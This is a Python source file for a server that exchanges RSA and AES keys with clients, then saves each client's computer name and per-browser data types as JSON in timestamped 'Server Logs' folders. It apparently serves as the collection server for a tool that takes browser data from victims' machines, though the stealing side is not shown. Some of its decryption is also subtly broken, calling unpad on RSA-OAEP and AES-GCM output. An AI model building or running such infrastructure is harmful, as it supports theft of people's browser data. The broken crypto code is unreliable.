""" IMPORTS """
import os
import json
from datetime import datetime
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import unpad


""" CONSTANTS """
KRWM_DIR = os.path.expanduser('~/Documents/KrwmTools')
LOGS_PATH = KRWM_DIR + '/Server Logs'

CLIENT_HEADER_LEN = 16
PUBLIC_KEY_LEN = 600 # b64 len of 450 for key len

FORMAT = 'utf-8'

rsa_info = {
    'public_key': b'',
    'cipher': None,
}



def initialise_RSA_cipher() -> None:
    """ Generates private and public key pairs for encryption and decryption """
    # generate RSA pairs
    key = RSA.generate(bits=2048)
    # generate private key
    private_key = key.export_key()
    # generate public key
    public_key = key.publickey().export_key()
    rsa_info['public_key'] = public_key
    # prepare RSA cipher
    cipher = PKCS1_OAEP.new(key)
    rsa_info['cipher'] = cipher


def get_public_key() -> bytes:
    """ Returns the base64-encoded public key """
    return b64encode(rsa_info['public_key'])


def extract_message(encoded_message: bytes) -> dict:
    """ Extracts encoded dictionary message """
    # Decode bytes to JSON string
    message = encoded_message.decode(FORMAT)
    # JSON string to dict
    message = json.loads(message)
    return message


def decrypt_message(encrypted_message: bytes, cipher) -> bytes:
    """ Decrypts a message with the provided cipher """
    decrypted_message = cipher.decrypt(encrypted_message)
    return unpad(decrypted_message, AES.block_size)


def extract_aes_cipher(client_socket):
    """
    Extract the AES cipher settings from the client socket
    and return an AES cipher object with the same settings
    """
    rsa_cipher = rsa_info['cipher']

    # Extract AES information
    aes_info = receive_message(client_socket)
    aes_info = decrypt_message(aes_info, rsa_cipher)
    aes_info = extract_message(aes_info)

    # Extract key and nonce
    aes_key = b64decode(aes_info['key'].encode(FORMAT))
    aes_nonce = b64decode(aes_info['nonce'].encode(FORMAT))

    # Generate AES cipher
    aes_cipher = AES.new(aes_key, AES.MODE_GCM, aes_nonce)
    return aes_cipher


def receive_message(client_socket) -> bytes:
    """ Receives a message from the client socket """
    # Get length of incoming message
    message_length = client_socket.recv(CLIENT_HEADER_LEN)
    if not message_length:
        return message_length
    message_length = int(message_length)

    # Receive rest of message
    received_message = b''
    while len(received_message) != message_length:
        missing_length = message_length - len(received_message)
        received_message += client_socket.recv(missing_length)

    print(f'Received {message_length} bytes')
    return received_message



def mkdir_if_not_exists(path: str) -> None:
    """ Creates a directory at path if it does not exist yet """
    if not os.path.exists(path):
        os.mkdir(path)


def log_setup(client_socket, aes_cipher) -> str:
    """ Setup log directories for client info """
    # Retrieve client info
    client_info = receive_message(client_socket)
    client_info = decrypt_message(client_info, aes_cipher)
    client_info = extract_message(client_info)
    computer_name = client_info['computer']

    # Setup client logs folder
    mkdir_if_not_exists(KRWM_DIR)
    mkdir_if_not_exists(LOGS_PATH)
    current_time = datetime.now().strftime(r'%Y-%m-%d %H-%M-%S')
    logs_dir = f'{LOGS_PATH}/{computer_name} {current_time}'
    mkdir_if_not_exists(logs_dir)
    return logs_dir


def log_message(message: dict, logs_dir: str) -> None:
    """ Logs a message into logs_dir """
    # Destructure message
    browser_name = message['browser']
    file_name = message['type']
    data = message['data']

    # Create browser directory if necessary
    browser_path = f'{logs_dir}/{browser_name}'
    mkdir_if_not_exists(browser_path)

    # Log data into file_path
    file_path = f'{browser_path}/{file_name}.json'
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)
